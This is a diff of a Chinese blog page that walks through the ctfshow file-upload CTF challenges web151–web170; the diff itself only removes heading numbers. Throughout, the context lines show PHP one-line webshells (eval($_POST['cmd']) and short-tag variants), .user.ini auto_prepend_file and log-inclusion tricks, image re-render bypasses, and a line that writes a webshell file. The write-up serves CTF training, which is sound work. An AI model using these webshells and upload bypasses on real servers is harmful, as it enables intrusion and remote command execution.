@@ -8,10 +8,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
     <title>ctfshow_file_upload - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="ctfshow_file_upload" />
-<meta property="og:description" content="1 总结：CTF中文件上传及文件包含总结
+<meta property="og:description" content="总结：CTF中文件上传及文件包含总结
 CTF文件上传漏洞总结
 文件上传马儿总结：
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 短标签马儿： 一般的马儿： &lt;?php eval（$_POST[&#39;cmd&#39;]);?&gt; 没有PHP的马儿 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;? eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;% eval（$_POST[&#39;cmd&#39;]);%&gt; 有PHP的马儿 &lt;script language=&#34;php&#34;&gt;&lt;/script&gt; 特殊马儿： 过滤[]：用{}代替 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; 直接拿flag的变形马儿 &lt;? echo `tac /var/www/html/f*`;?" />
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 短标签马儿： 一般的马儿： &lt;?php eval（$_POST[&#39;cmd&#39;]);?&gt; 没有PHP的马儿 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;? eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;% eval（$_POST[&#39;cmd&#39;]);%&gt; 有PHP的马儿 &lt;script language=&#34;php&#34;&gt;&lt;/script&gt; 特殊马儿： 过滤[]：用{}代替 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; 直接拿flag的变形马儿 &lt;? echo `tac /var/www/html/f*`;?&gt; &lt;?" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://scofield1920.github.io/ctfshow_file_upload/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
 
@@ -21,10 +21,10 @@ CTF文件上传漏洞总结
 <meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
 
 <meta name="twitter:title" content="ctfshow_file_upload"/>
-<meta name="twitter:description" content="1 总结：CTF中文件上传及文件包含总结
+<meta name="twitter:description" content="总结：CTF中文件上传及文件包含总结
 CTF文件上传漏洞总结
 文件上传马儿总结：
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 短标签马儿： 一般的马儿： &lt;?php eval（$_POST[&#39;cmd&#39;]);?&gt; 没有PHP的马儿 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;? eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;% eval（$_POST[&#39;cmd&#39;]);%&gt; 有PHP的马儿 &lt;script language=&#34;php&#34;&gt;&lt;/script&gt; 特殊马儿： 过滤[]：用{}代替 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; 直接拿flag的变形马儿 &lt;? echo `tac /var/www/html/f*`;?"/>
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 短标签马儿： 一般的马儿： &lt;?php eval（$_POST[&#39;cmd&#39;]);?&gt; 没有PHP的马儿 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;? eval（$_POST[&#39;cmd&#39;]);?&gt; &lt;% eval（$_POST[&#39;cmd&#39;]);%&gt; 有PHP的马儿 &lt;script language=&#34;php&#34;&gt;&lt;/script&gt; 特殊马儿： 过滤[]：用{}代替 &lt;?= eval（$_POST[&#39;cmd&#39;]);?&gt; 直接拿flag的变形马儿 &lt;? echo `tac /var/www/html/f*`;?&gt; &lt;?"/>
 <meta name="application-name" content="DoIt">
 <meta name="apple-mobile-web-app-title" content="DoIt">
 
@@ -42,7 +42,7 @@ CTF文件上传漏洞总结
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/scofield1920.github.io\/ctfshow_file_upload\/"
-        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, web","wordcount":  1143 ,
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, web","wordcount":  1125 ,
         "url": "http:\/\/scofield1920.github.io\/ctfshow_file_upload\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -185,7 +185,7 @@ CTF文件上传漏洞总结
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
                 </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1143 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1125 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -217,7 +217,7 @@ CTF文件上传漏洞总结
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="总结" class="headerLink">
-    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>1 总结：</h2><p><a href="https://www.ngui.cc/el/3197856.html?action=onClick" target="_blank" rel="noopener noreferrer">CTF中文件上传及文件包含总结</a></p>
+    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结：</h2><p><a href="https://www.ngui.cc/el/3197856.html?action=onClick" target="_blank" rel="noopener noreferrer">CTF中文件上传及文件包含总结</a></p>
 <p><a href="http://cn-sec.com/archives/1116089.html" target="_blank" rel="noopener noreferrer">CTF文件上传漏洞总结</a></p>
 <p>文件上传马儿总结：</p>
 <div class="highlight"><div class="chroma">
@@ -313,8 +313,8 @@ CTF文件上传漏洞总结
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="靶场题目" class="headerLink">
-    <a href="#%e9%9d%b6%e5%9c%ba%e9%a2%98%e7%9b%ae" class="header-mark"></a>2 靶场题目：</h2><h3 id="web151" class="headerLink">
-    <a href="#web151" class="header-mark"></a>2.1 [web151]</h3><p>前端校验文件类型，上传png图片马</p>
+    <a href="#%e9%9d%b6%e5%9c%ba%e9%a2%98%e7%9b%ae" class="header-mark"></a>靶场题目：</h2><h3 id="web151" class="headerLink">
+    <a href="#web151" class="header-mark"></a>[web151]</h3><p>前端校验文件类型，上传png图片马</p>
 <p>再通过bp抓包修改文件后缀，蚁剑连接</p>
 <p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png" title="image-20230725170506084" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725170506084.png">
         <img
@@ -346,7 +346,7 @@ CTF文件上传漏洞总结
             alt="image-20230725170711639">
     </a></figure></p>
 <h3 id="web152" class="headerLink">
-    <a href="#web152" class="header-mark"></a>2.2 [web152]</h3><p>后端验证实际上是验证Content-Type</p>
+    <a href="#web152" class="header-mark"></a>[web152]</h3><p>后端验证实际上是验证Content-Type</p>
 <p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png" title="image-20230725172718121" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725172718121.png">
         <img
             
@@ -366,7 +366,7 @@ CTF文件上传漏洞总结
             alt="image-20230725172654596">
     </a></figure></p>
 <h3 id="web153" class="headerLink">
-    <a href="#web153" class="header-mark"></a>2.3 [web153]</h3><p><strong>.user.ini</strong></p>
+    <a href="#web153" class="header-mark"></a>[web153]</h3><p><strong>.user.ini</strong></p>
 <p>原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</p>
 <p><strong>注：</strong></p>
 <div class="highlight"><div class="chroma">
@@ -421,7 +421,7 @@ CTF文件上传漏洞总结
             alt="image-20230726103906855">
     </a></figure></p>
 <h3 id="web154" class="headerLink">
-    <a href="#web154" class="header-mark"></a>2.4 [web154]</h3><p>上题思路可解</p>
+    <a href="#web154" class="header-mark"></a>[web154]</h3><p>上题思路可解</p>
 <p>如果带木马的不行，然后就更换短标签一个个试</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -433,7 +433,7 @@ CTF文件上传漏洞总结
 </div>
 </div><p>web155(内容过滤php)同上</p>
 <h3 id="web156" class="headerLink">
-    <a href="#web156" class="header-mark"></a>2.5 [web156]</h3><p>过滤了文件内的<code>[]</code>,可以改成<code>{}</code>来绕过</p>
+    <a href="#web156" class="header-mark"></a>[web156]</h3><p>过滤了文件内的<code>[]</code>,可以改成<code>{}</code>来绕过</p>
 <p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png" title="image-20230726114212624" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726114212624.png">
         <img
             
@@ -444,7 +444,7 @@ CTF文件上传漏洞总结
             alt="image-20230726114212624">
     </a></figure></p>
 <h3 id="web157" class="headerLink">
-    <a href="#web157" class="header-mark"></a>2.6 [web157]</h3><p>经测试，对文件内容过滤了 <code>php</code>、<code>[</code>、<code>{</code>、 <code>;</code></p>
+    <a href="#web157" class="header-mark"></a>[web157]</h3><p>经测试，对文件内容过滤了 <code>php</code>、<code>[</code>、<code>{</code>、 <code>;</code></p>
 <p>上传<code>.user.ini</code></p>
 <p>php 最后的语句也可以不加分号的，前提是得有 <code>?&gt;</code>结束标志。</p>
 <p>修改图片马的内容</p>
@@ -486,7 +486,7 @@ CTF文件上传漏洞总结
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="web160" class="headerLink">
-    <a href="#web160" class="header-mark"></a>2.7 [web160]</h3><p>过滤了反引号，我们可以包含日志</p>
+    <a href="#web160" class="header-mark"></a>[web160]</h3><p>过滤了反引号，我们可以包含日志</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -535,7 +535,7 @@ CTF文件上传漏洞总结
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="web161" class="headerLink">
-    <a href="#web161" class="header-mark"></a>2.8 [web161]</h3><p>检测文件头</p>
+    <a href="#web161" class="header-mark"></a>[web161]</h3><p>检测文件头</p>
 <p>上传 <code>GIF89a</code>成功绕过</p>
 <p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png" title="image-20230726152634628" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230726152634628.png">
         <img
@@ -557,7 +557,7 @@ CTF文件上传漏洞总结
             alt="image-20230726153507813">
     </a></figure></p>
 <h3 id="web162" class="headerLink">
-    <a href="#web162" class="header-mark"></a>2.9 [web162]</h3><p>检测了文件头，同时过滤了点<code>.</code></p>
+    <a href="#web162" class="header-mark"></a>[web162]</h3><p>检测了文件头，同时过滤了点<code>.</code></p>
 <p><strong>session包含</strong></p>
 <p>**条件竞争：**我们上传的文件如果不符合要求，就会被删除，导致成功上传无法访问，没有用。但是如果我们上传的速度比服务器删的速度快，就可以了。</p>
 <p>修改ini文件内容</p>
@@ -623,7 +623,7 @@ CTF文件上传漏洞总结
 <p><code>2333&lt;?php $code='&lt;?php eval($_POST[1]);?&gt;;file_put_contents('a.php',$code);?&gt;</code></p>
 <p>也可以远程包含自己vps上的马</p>
 <h3 id="web164" class="headerLink">
-    <a href="#web164" class="header-mark"></a>2.10 [web164]</h3><p><strong>PNG二次渲染</strong></p>
+    <a href="#web164" class="header-mark"></a>[web164]</h3><p><strong>PNG二次渲染</strong></p>
 <p>尝试上传图片，查看上传后的路径，存在文件包含</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -726,7 +726,7 @@ post：<code>1=tac flag.php</code></p>
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="web165" class="headerLink">
-    <a href="#web165" class="header-mark"></a>2.11 [web165]</h3><p><strong>JPG二次渲染</strong></p>
+    <a href="#web165" class="header-mark"></a>[web165]</h3><p><strong>JPG二次渲染</strong></p>
 <p>相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。</p>
 <p>上传正常jpg图片后访问，抓包发到重放器中，发现图片经过二次渲染
 <figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png" title="image-20230727111023352" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230727111023352.png">
@@ -1102,7 +1102,7 @@ post：<code>1=tac flag.php</code></p>
     </a></figure></p>
 <p>上传后可搭配bp抓包实现命令执行</p>
 <h3 id="web166" class="headerLink">
-    <a href="#web166" class="header-mark"></a>2.12 [web166]</h3><p>只能上传zip，那我们就上传一个一句话的zip文件，然后用蚁剑连接</p>
+    <a href="#web166" class="header-mark"></a>[web166]</h3><p>只能上传zip，那我们就上传一个一句话的zip文件，然后用蚁剑连接</p>
 <p>新建一个zip文件，后面插入一句话木马</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1133,7 +1133,7 @@ post：<code>1=tac flag.php</code></p>
             alt="image-20230728020601373">
     </a></figure></p>
 <h3 id="web167" class="headerLink">
-    <a href="#web167" class="header-mark"></a>2.13 [web167]</h3><p>根据提示上传了包含shell的jpg文件,上传成功,点击下载文件,发现没有存在文件包含点,访问upload检查是否有可执行文件,提示没有权限,但是发现中间件是Apache</p>
+    <a href="#web167" class="header-mark"></a>[web167]</h3><p>根据提示上传了包含shell的jpg文件,上传成功,点击下载文件,发现没有存在文件包含点,访问upload检查是否有可执行文件,提示没有权限,但是发现中间件是Apache</p>
 <p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png" title="image-20230728103941301" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728103941301.png">
         <img
             
@@ -1187,7 +1187,7 @@ post：<code>1=tac flag.php</code></p>
     </a></figure></p>
 <p>hackbar命令执行或者蚁剑连接</p>
 <h3 id="web168" class="headerLink">
-    <a href="#web168" class="header-mark"></a>2.14 [web168]</h3><p>png改包为php，但需要免杀马</p>
+    <a href="#web168" class="header-mark"></a>[web168]</h3><p>png改包为php，但需要免杀马</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1268,14 +1268,14 @@ post：<code>1=tac flag.php</code></p>
             alt="image-20230728121442185">
     </a></figure></p>
 <h3 id="web169" class="headerLink">
-    <a href="#web169" class="header-mark"></a>2.15 [web169]</h3><p>过滤了<code>&lt;</code>，无法执行PHP代码，于是考虑<strong>日志包含</strong></p>
+    <a href="#web169" class="header-mark"></a>[web169]</h3><p>过滤了<code>&lt;</code>，无法执行PHP代码，于是考虑<strong>日志包含</strong></p>
 <p>前端限制必须上传zip，且<code>file_content</code>需修改为<code>image/png</code></p>
 <p>同时在<code>user-agent</code>中写入一句话木马，<code>&lt;?php eval（$_POST['cmd']);?&gt;</code></p>
 <p>随后上传一个<code>.user.ini</code>文件，<code>auto_prepend_file=/var/log/nginx/access.log</code></p>
 <p>再上传一个<code>1.php</code>文件，内容随便写，因为<code>url/upload/</code>目录下没有文件，所以需要写一个文件来承接<code>.user.ini</code></p>
 <p>接着就可以访问<code>/url/upload/1.php</code>，然后rce或者用蚁剑连接</p>
 <h3 id="web170" class="headerLink">
-    <a href="#web170" class="header-mark"></a>2.16 [web170]</h3><p>题解同上</p>
+    <a href="#web170" class="header-mark"></a>[web170]</h3><p>题解同上</p>
 </div>
 
         
